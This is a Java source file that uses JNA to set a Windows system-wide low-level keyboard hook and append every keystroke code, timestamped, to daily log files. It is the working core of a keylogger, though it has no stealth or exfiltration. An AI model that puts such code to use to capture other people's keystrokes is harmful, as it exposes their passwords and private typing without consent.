package com.Hook;


import com.sun.jna.examples.win32.Kernel32;
import com.sun.jna.examples.win32.User32;
import com.sun.jna.examples.win32.User32.HHOOK;
import com.sun.jna.examples.win32.User32.LowLevelKeyboardProc;
import com.sun.jna.examples.win32.User32.MSG;
import com.sun.jna.examples.win32.W32API.HMODULE;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;

/**
 * 接下来是监听键盘的代码
 * http://blog.csdn.net/qq_27099139/article/details/73530614
 */
public class KeyboardHook implements Runnable{

    private static HHOOK hhk;
    private static LowLevelKeyboardProc keyboardHook;
    final static User32 lib = User32.INSTANCE;
    private boolean [] on_off=null;

    public KeyboardHook(boolean [] on_off){
        this.on_off = on_off;
    }

    public void run() {

        HMODULE hMod = Kernel32.INSTANCE.GetModuleHandle(null);
        keyboardHook = (nCode, wParam, info) -> {
            SimpleDateFormat df1 = new SimpleDateFormat("yyyy-MM-dd");
            SimpleDateFormat df2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
            String fileName=df1.format(new Date());
            String time=df2.format(new Date());
            BufferedWriter bw1=null;
            BufferedWriter bw2=null;
            try {
                bw1=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Keyboard.txt"),true));
                bw2=new BufferedWriter(new FileWriter(new File(".//log//"+fileName+"_Common.txt"),true));

            } catch (IOException e) {
                e.printStackTrace();
            }
            if (on_off[0] == false) {
                System.exit(0);
            }
            try {
                bw1.write(time+"  ####  "+info.vkCode+"\r\n");
                bw2.write(time+"  ####  "+info.vkCode+"\r\n");
                bw1.flush();
                bw2.flush();
            } catch (IOException e) {
                e.printStackTrace();
            }
            return lib.CallNextHookEx(hhk, nCode, wParam, info.getPointer());
        };
        hhk = lib.SetWindowsHookEx(User32.WH_KEYBOARD_LL, keyboardHook, hMod, 0);
        int result;
        MSG msg = new MSG();
        while ((result = lib.GetMessage(msg, null, 0, 0)) != 0) {
            if (result == -1) {
                System.err.println("error in get message");
                break;
            } else {
                System.err.println("got message");
                lib.TranslateMessage(msg);
                lib.DispatchMessage(msg);
            }
        }
        lib.UnhookWindowsHookEx(hhk);
    }

}
